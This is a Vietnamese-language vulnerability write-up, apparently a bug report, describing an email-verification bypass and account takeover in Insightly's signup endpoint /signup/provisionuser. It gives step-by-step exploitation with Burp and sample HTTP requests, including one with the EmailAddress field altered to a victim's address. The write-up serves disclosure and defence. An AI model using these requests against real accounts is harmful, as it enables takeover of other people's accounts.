**Tóm tắt lỗi:**

Đây là lỗi **Account Takeover/Email Verification Bypass** CRITICAL (9.7/10) trong signup flow của Insightly. Attacker có thể tạo account hoặc takeover existing account bằng cách thay đổi parameter `EmailAddress` trong request.

**Nguyên nhân:**  
Endpoint `/signup/provisionuser` không verify email ownership, cho phép attacker đăng ký hoặc access account với email của người khác.

---

## **Chi tiết kỹ thuật:**

### **Flow bình thường:**
1. User sign up với email `victim@company.com`
2. Insightly gửi verification email
3. User click link → verify → account được tạo

### **Flow bị khai thác:**
1. Attacker sign up với email của họ
2. Chặn request `/signup/provisionuser` trong Burp
3. Sửa `EmailAddress` thành `victim@company.com`
4. Server tạo account cho victim mà không cần verification
5. Hoặc access existing account của victim

---

## **Ví dụ Request/Response:**

### **1. Request sign up ban đầu:**
```http
POST /signup/provisionuser HTTP/1.1
Host: accounts.insightly.com
Content-Type: application/json

{
  "EmailAddress": "attacker@gmail.com",
  "FirstName": "Attacker",
  "LastName": "Test",
  "Password": "Attack123!",
  "Company": "Evil Corp"
}
```

### **2. Attacker chặn và sửa request:**
```http
POST /signup/provisionuser HTTP/1.1
Host: accounts.insightly.com
Content-Type: application/json

{
  "EmailAddress": "ceo@target-company.com",  # 🚨 ĐÃ SỬA
  "FirstName": "Attacker",
  "LastName": "Test",
  "Password": "Attack123!",
  "Company": "Evil Corp"
}
```

### **3. Response thành công (không hợp lệ):**
```json
{
  "success": true,
  "userId": "usr_123456",
  "sessionToken": "eyJhbGciOiJIUzI1NiIs...",
  "redirectUrl": "/dashboard"
}
```

### **4. Attacker đã có access đến:**
- **New account:** Nếu email chưa tồn tại trong hệ thống
- **Existing account:** Nếu email đã có account (account takeover)
- **Trial reset:** 15-day trial bắt đầu lại cho existing account

---
